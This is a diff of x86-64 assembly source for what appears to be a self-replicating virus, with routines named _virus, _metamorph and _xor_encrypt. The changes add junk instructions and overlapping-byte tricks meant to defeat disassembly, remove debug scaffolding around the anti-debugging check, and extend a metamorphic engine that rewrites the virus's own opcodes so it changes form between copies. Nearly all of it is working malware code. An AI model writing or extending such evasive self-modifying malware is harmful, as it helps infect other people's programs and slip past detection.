@@ -177,12 +177,25 @@ _h3ll0w0rld:
 	nop
 	lea rsi, [rel debugging]
 	jmp $+6
-	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
+	db `\x48\xb8\x13\x37`
+	push 12
+	nop
+	pop rdx
+	nop
+	xor rax, rax
+	nop
+	nop
+	nop
+	add rax, 1
 	syscall
 
 	jmp $+4; has to skip 2 byte of instruction next line
-	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
-	;                            from right to left
+	db `\x48\xbf`
+	push 1
+	pop rdi
+	push 60
+	pop rax
+	jmp $+5
 	.ft_juggling:
 	db `\x48\xb8`; TRASH ; mov rax,
 	db `\x42`
@@ -218,9 +231,6 @@ _h3ll0w0rld:
 		cmp rax, 0x0
 		jz _virus
 %else
-; = DEBUG
-;		jmp _virus
-; =
 		call _virus
 %endif
 		jmp _prg
@@ -298,7 +308,6 @@ ret
 
 _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	push r8
-	push r9
 	push rbx
 
 	xor rax, rax
@@ -323,7 +332,6 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 		mov rbx, rdi
 		add rdi, r8
 		push rsi
-		pop r9
 		push rdx
 		pop rsi
 		push rcx
@@ -333,7 +341,6 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 		pop rcx
 		push rsi
 		pop rdx
-		push r9
 		pop rsi
 		push rbx
 		pop rdi
@@ -347,7 +354,6 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	.return:
 
 	pop rbx
-	pop r9
 	pop r8
 ret
 
@@ -1278,7 +1284,7 @@ _metamorph:; (rdi -> ptr)
 	pop rdi
 
 	lea rax, [rel _params]
-	lea rsi, [rel _exit]
+	lea rsi, [rel _ft_strlen]
 	lea rcx, [rel _xor_encrypt]
 	sub rsi, rcx
 	sub rcx, rax
@@ -1300,6 +1306,8 @@ _metamorph:; (rdi -> ptr)
 		je .cmp
 		cmp byte[rdi + rcx], 0x42
 		je .mov_xor_byte
+		cmp byte[rdi + rcx], 0x4c
+		je .add_left
 		jmp .continue
 		.push:
 			inc rcx
@@ -1315,6 +1323,10 @@ _metamorph:; (rdi -> ptr)
 			jmp .continue
 		.mov_xor_byte:
 			add rcx, 3
+			add byte[rdi + rcx], 8
+			jmp .continue
+		.add_left:
+			add rcx, 2
 			add byte[rdi + rcx], 8
 		.continue:
 		inc rcx
